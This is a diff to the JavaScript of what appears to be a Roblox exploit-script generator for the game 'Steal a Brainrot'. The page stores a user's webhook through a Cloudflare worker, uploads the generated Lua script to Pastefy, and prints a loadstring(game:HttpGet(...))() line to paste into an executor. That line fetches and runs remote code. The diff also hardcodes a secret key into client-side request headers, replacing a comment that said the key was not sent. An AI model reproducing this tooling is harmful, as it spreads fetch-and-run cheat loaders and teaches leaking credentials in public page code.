@@ -765,7 +765,7 @@ const ANIMALS = [
   { name: "Jackorilla", rarity: "Secret", mps: "315K/s" },
   { name: "Secret Lucky Block", rarity: "Secret", mps: "0/s" }
 ];
- const KV_WORKER_URL = 'https://apidihvaluevinhub.imran-ouarezki.workers.dev/';
+ const KV_WORKER_URL = 'https://young-bonus-cf67.dongdihng.workers.dev';
 
 function generateAlias(length = 8) {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -777,6 +777,7 @@ function generateAlias(length = 8) {
   }
   return result;
 }
+
 
 let selected = new Set();
 let adminMode = 'no-gui';
@@ -799,8 +800,7 @@ function setAdminMode(mode) {
 function updateCustomAdmin() {
   customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
 }
-
-async function uploadToPastefy(script) {
+ async function uploadToPastefy(script) {
   try {
     const response = await fetch('https://pastefy.app/api/v2/paste', {
       method: 'POST',
@@ -828,8 +828,7 @@ async function uploadToPastefy(script) {
     return null;
   }
 }
-
-async function generate() {
+ async function generate() {
   const btn = document.querySelector('.btn-gen');
   const out = document.getElementById('outputBlock');
 
@@ -848,16 +847,18 @@ async function generate() {
 
     const alias = generateAlias();
 
-    // Envoi des données au Worker SANS la clé secrète
+
     const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
+        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'
       },
       body: JSON.stringify({ alias, url: webhook })
     });
 
     if (!kvResponse.ok) throw new Error('Failed to store webhook.');
+
 
     const names = [...selected];
     const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
@@ -884,14 +885,21 @@ end)
 ${adminScriptPart}
 `;
 
+
     const pastefyRawUrl = await uploadToPastefy(script);
 
     if (pastefyRawUrl) {
       out.className = 'code-block';
-      out.textContent = `loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
+      out.textContent = `-- Script uploaded to Pastefy successfully!
+Copy this loadstring into your executor:
+
+loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
     } else {
       out.className = 'code-block';
-      out.textContent = `${script}`;
+      out.textContent = `-- Failed to upload to Pastefy.
+Here is the raw script (copy it manually):
+
+${script}`;
     }
 
   } catch (err) {
@@ -1085,12 +1093,13 @@ async function generate() {
 
 
     const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json', // ✅ Seule cette ligne est nécessaire
-  },
-  body: JSON.stringify({ alias, url: webhook })
-});
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'
+      },
+      body: JSON.stringify({ alias, url: webhook })
+    });
 
     if (!kvResponse.ok) throw new Error('Failed to store webhook.');
 
